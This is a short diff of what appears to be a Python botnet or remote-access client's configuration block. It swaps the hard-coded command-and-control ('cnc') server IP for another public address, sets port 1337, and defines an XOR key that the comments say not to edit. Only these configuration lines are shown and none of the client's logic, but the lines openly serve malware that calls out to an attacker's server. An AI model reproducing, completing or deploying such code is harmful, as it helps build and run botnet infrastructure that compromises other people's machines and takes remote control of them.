@@ -15,7 +15,7 @@ import random
 import threading
 import base64 as b64
 
-cnc   = str("34.123.213.156")#your cnc ip
+cnc   = str("35.232.227.234")#your cnc ip
 cport = int(1337)#your cnc port
 key   = "asdfghjkloiuytresxcvbnmliuytf"
 #xor key, don't edit it if u don't know wtf is this#
